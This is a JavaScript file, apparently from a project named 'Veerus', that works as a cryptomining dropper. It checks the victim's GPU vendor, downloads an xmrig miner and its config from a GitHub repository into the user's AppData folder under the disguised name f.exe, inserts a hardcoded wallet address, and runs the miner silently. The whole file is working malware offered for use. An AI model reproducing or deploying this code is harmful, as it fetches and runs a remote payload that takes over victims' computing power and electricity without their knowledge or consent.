const request = require('request');
const fs = require('fs');
const { exec } = require("child_process");
const gpuInfo = require('gpu-info');



const urss = require("os").userInfo().username;
var nvidia = false;
var AMD = false;
var cantOpenMiner = false;
var output = `C:\\Users\\${urss}\\AppData\\Roaming\\f.exe`;
var ConfigOutput = `C:\\Users\\${urss}\\AppData\\Roaming\\config.json`;





const walletAddr = "1MGaf2fJYguFVq2MhuEzbs5FbKNSN8QZkA"






async function MinerMain () {

  gpuInfo().then(function(data) {
      var infosG = data;
      if(JSON.stringify(data).includes("nvidia") || JSON.stringify(data).includes("NVIDIA")){
        nvidia = true
      }else if(JSON.stringify(data).includes("amd") || JSON.stringify(data).includes("AMD")){
        AMD = true;
      }else{
        nvidia = false;
      }
      console.log("Nvidia? : " + nvidia)
      console.log("AMD? : " + AMD)
  });


  var fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe";
  var ConfigUrl = "https://raw.githubusercontent.com/0xSxZ/Veerus/main/MINER_IMPORTANT/clientdownloads/config.json";
  if(nvidia == true){
    fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-nvidia.exe"
  }else if(AMD == true){
    fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-amd.exe"
  }else{
    fileUrl = `https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe`;
  }


  await request({url: fileUrl, encoding: null}, function(err, resp, body) {
    try{

      fs.writeFile(output, body, function(err) {
        console.log("file written!");
      });
    }catch{
      cantOpenMiner = true;
    }
  });

  await request(ConfigUrl, function(err, resp, body) {
    try{

      fs.writeFile(ConfigOutput, body.replace("YOUR_WALLET_ADDRESS", walletAddr), function(err) {
        console.log("file written!");
      });
    }catch{
      cantOpenMiner = true;
    }
  });

  await console.log("Starting Miner")


  await console.log("Miner Started in worker 1")


  await MinerThread()
}



function MinerThread(){

  console.log("Miner Started in worker 2")
  if(cantOpenMiner == false){
    exec(output, (error, stdout, stderr) => {
      console.log(stdout)
    });
  }
}


MinerMain();